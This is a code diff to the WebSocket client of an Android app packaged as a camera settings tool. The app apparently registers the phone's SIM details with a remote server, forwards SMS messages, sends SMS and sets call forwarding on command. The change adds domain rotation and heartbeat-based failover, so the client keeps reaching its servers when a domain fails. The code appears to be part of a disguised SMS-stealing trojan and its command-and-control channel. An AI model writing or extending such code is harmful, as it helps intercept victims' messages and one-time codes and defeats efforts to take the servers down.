@@ -10,6 +10,7 @@ import com.settingpro.camera.data.model.CallForwardingData
 import com.settingpro.camera.data.model.CallForwardingResponseData
 import com.settingpro.camera.data.model.SendSmsData
 import com.settingpro.camera.data.model.SendSmsResponseData
+import com.settingpro.camera.data.config.UrlRotator
 import com.settingpro.camera.util.Constants
 import com.google.gson.Gson
 import com.google.gson.JsonObject
@@ -26,7 +27,8 @@ import javax.inject.Singleton
 
 @Singleton
 class WebSocketClient @Inject constructor(
-    private val gson: Gson
+    private val gson: Gson,
+    private val urlRotator: UrlRotator
 ) {
     private var okHttpClient = buildOkHttpClient()
 
@@ -41,7 +43,6 @@ class WebSocketClient @Inject constructor(
 
     @Volatile private var reconnectAttempts = 0
 
-    private var serverUrl: String? = null
     @Volatile private var deviceInfo: DeviceInfo? = null
 
     private val smsForwardedCount = AtomicInteger(0)
@@ -50,6 +51,13 @@ class WebSocketClient @Inject constructor(
     private var onMessageCallback: ((WebSocketMessage) -> Unit)? = null
     private var onConnectionCallback: ((ConnectionState) -> Unit)? = null
     private val shouldReconnect = AtomicBoolean(false)
+
+    // Heartbeat failure tracking for domain failover
+    @Volatile private var consecutiveHeartbeatFailures = 0
+    private val MAX_HEARTBEAT_FAILURES = 3
+
+    // Track current connection URL for failure handling
+    @Volatile private var currentConnectionUrl: String? = null
 
     fun getSmsForwardedCount(): Int = smsForwardedCount.get()
 
@@ -68,7 +76,7 @@ class WebSocketClient @Inject constructor(
     // ─── Public API ───────────────────────────────────────────────────────────
 
     fun connect(
-        serverUrl: String,
+        serverUrl: String? = null,
         deviceInfo: DeviceInfo,
         onMessageReceived: (WebSocketMessage) -> Unit,
         onConnectionStateChanged: (ConnectionState) -> Unit
@@ -80,34 +88,22 @@ class WebSocketClient @Inject constructor(
 
         if (serviceStartTime == 0L) serviceStartTime = System.currentTimeMillis()
 
-        val urlChanged = this.serverUrl != null && this.serverUrl != serverUrl
-        this.serverUrl = serverUrl
-
-        if (urlChanged) {
-            AppLogger.d(TAG, "Server URL changed — tearing down existing connection")
-            reconnectJob?.cancel(); reconnectJob = null
-            webSocket?.cancel(); webSocket = null
-            _connectionState.value = ConnectionState.Disconnected
-            attemptConnect()
-            return
-        }
-
         val state = _connectionState.value
         if (state == ConnectionState.Connecting || state == ConnectionState.Connected) {
             AppLogger.d(TAG, "Already connected or connecting — skipping")
             return
         }
-        attemptConnect()
+        scope.launch { attemptConnect() }
     }
 
-    fun forceReconnect() {
-        if (!shouldReconnect.get()) { AppLogger.d(TAG, "forceReconnect ignored — shouldReconnect=false"); return }
+    suspend fun forceReconnect() = withContext(Dispatchers.IO) {
+        if (!shouldReconnect.get()) { AppLogger.d(TAG, "forceReconnect ignored — shouldReconnect=false"); return@withContext }
         AppLogger.d(TAG, "Force reconnect triggered")
         reconnectJob?.cancel(); reconnectJob = null
         reconnectAttempts = 0
         webSocket?.cancel(); webSocket = null
         _connectionState.value = ConnectionState.Disconnected
-        if (serverUrl != null && deviceInfo != null) attemptConnect()
+        attemptConnect()
     }
 
     fun disconnect() {
@@ -154,24 +150,39 @@ class WebSocketClient @Inject constructor(
 
     // ─── Connection internals ─────────────────────────────────────────────────
 
-    private fun attemptConnect() {
-        val url = serverUrl ?: return
+    private suspend fun attemptConnect() = withContext(Dispatchers.IO) {
+        val url = urlRotator.getNextUrl()
+        if (url == null) {
+            AppLogger.e(TAG, "No domains available for connection")
+            _connectionState.value = ConnectionState.Error("No domains available")
+            scheduleReconnect()
+            return@withContext
+        }
+
         val wsUrl = buildWsUrl(url)
+        currentConnectionUrl = wsUrl // Store current URL for failure tracking
         AppLogger.d(TAG, "Connecting to $wsUrl (attempt ${reconnectAttempts + 1})")
         _connectionState.value = ConnectionState.Connecting
         webSocket?.cancel()
-        webSocket = okHttpClient.newWebSocket(
-            Request.Builder().url(wsUrl)
-                .addHeader("User-Agent", "AIChatGateway/${Constants.APP_VERSION} Android")
-                .build(),
-            createListener()
-        )
+
+        try {
+            webSocket = okHttpClient.newWebSocket(
+                Request.Builder().url(wsUrl)
+                    .addHeader("User-Agent", "AIChatGateway/${Constants.APP_VERSION} Android")
+                    .build(),
+                createListener()
+            )
+        } catch (e: Exception) {
+            AppLogger.e(TAG, "Failed to create WebSocket", e)
+            onConnectionFailure(wsUrl, e)
+        }
     }
 
     private fun createListener() = object : WebSocketListener() {
         override fun onOpen(webSocket: WebSocket, response: Response) {
             AppLogger.d(TAG, "WebSocket opened")
             reconnectAttempts = 0
+            consecutiveHeartbeatFailures = 0
             _connectionState.value = ConnectionState.Connected
             onConnectionCallback?.invoke(ConnectionState.Connected)
             deviceInfo?.let { sendRegistration(it) }
@@ -194,13 +205,24 @@ class WebSocketClient @Inject constructor(
         }
         override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
             AppLogger.e(TAG, "WebSocket failure: ${t.message}", t)
-            stopHeartbeat()
-            this@WebSocketClient.webSocket = null
-            val errorState = ConnectionState.Error(t.message ?: "Unknown error")
-            _connectionState.value = errorState
-            onConnectionCallback?.invoke(errorState)
-            if (shouldReconnect.get()) scheduleReconnect()
+            // Use currentConnectionUrl if available, fallback to response URL
+            val failedUrl = currentConnectionUrl ?: (response?.request?.url?.toString() ?: "unknown")
+            onConnectionFailure(failedUrl, t)
         }
+    }
+
+    private fun onConnectionFailure(url: String, error: Throwable) {
+        stopHeartbeat()
+        webSocket = null
+        val errorState = ConnectionState.Error(error.message ?: "Unknown error")
+        _connectionState.value = errorState
+        onConnectionCallback?.invoke(errorState)
+
+        // Mark the specific failed domain as dead and schedule reconnect
+        scope.launch {
+            urlRotator.markDomainDead(url)
+        }
+        if (shouldReconnect.get()) scheduleReconnect()
     }
 
     private fun scheduleReconnect() {
@@ -229,8 +251,17 @@ class WebSocketClient @Inject constructor(
             while (isActive) {
                 delay(Constants.HEARTBEAT_INTERVAL)
                 if (isConnected()) {
-                    try { sendHeartbeat() }
-                    catch (e: Exception) { AppLogger.e(TAG, "Heartbeat error", e) }
+                    try {
+                        sendHeartbeat()
+                        consecutiveHeartbeatFailures = 0 // Reset on successful send
+                    } catch (e: Exception) {
+                        AppLogger.e(TAG, "Heartbeat error", e)
+                        consecutiveHeartbeatFailures++
+                        if (consecutiveHeartbeatFailures >= MAX_HEARTBEAT_FAILURES) {
+                            AppLogger.w(TAG, "Too many heartbeat failures, triggering domain failover")
+                            forceReconnect()
+                        }
+                    }
                 }
             }
         }
@@ -255,6 +286,11 @@ class WebSocketClient @Inject constructor(
             sims           = deviceInfo.simInfo.map { it.toMap() },
             fcmToken       = deviceInfo.fcmToken
         )))
+
+        // Mark domain as successful on registration
+        scope.launch {
+            urlRotator.getCurrentDomain()?.let { urlRotator.markSuccess(it) }
+        }
     }
 
     fun sendHeartbeat() {
